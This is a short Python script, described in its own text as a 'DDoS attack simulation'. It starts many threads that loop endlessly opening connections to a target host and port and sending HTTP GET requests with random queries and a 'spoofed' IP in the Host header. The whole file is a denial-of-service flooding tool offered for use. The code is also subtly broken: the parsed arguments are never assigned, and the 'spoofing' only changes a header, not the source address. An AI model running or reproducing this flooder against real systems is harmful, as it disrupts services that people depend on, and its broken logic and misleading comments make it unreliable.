import threading
import socket
import argparse
import random
import time

# Set up argument parsing, get IP addresses and port numbers from the CLI as the script runs
parser = argparse.ArgumentParser(description="DDoS attack simulation script.")
parser.add_argument("target", type=str, help="Target IP address")
parser.add_argument("port", type=int, help="Target port")
parser.add_argument("spoofedIP", type=str, help="Spoofed source IP address to include in the request headers")
parser.add_argument("--threads", type=int, default=100, help="Number of threads to launch (default: 100)")

def attack():
    while True:
        #creating a TCP/IP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #connecting to the target
        s.connect((args.target, args.port))

        #sending HTTP GET requests with spooferd IP in headers
        payload = f"GET /index.html?query={random.randint(1000,9999)} HTTP/1.1\r\n"
        s.sendto(payload.encode('ascii'), (args.target, args.port))
        s.sendto((f"Host: {args.spoofedIP}\r\n\r\n").encode('ascii'), (args.target, args.port))

        #close the socket a bit to keep it persistent
        time.sleep(random.uniform(0.5, 2.0))
        s.close()
        
#Launch multiple threads for the attack
for i in range(args.threads):
    thread = threading.Thread(target=attack)
    thread.start()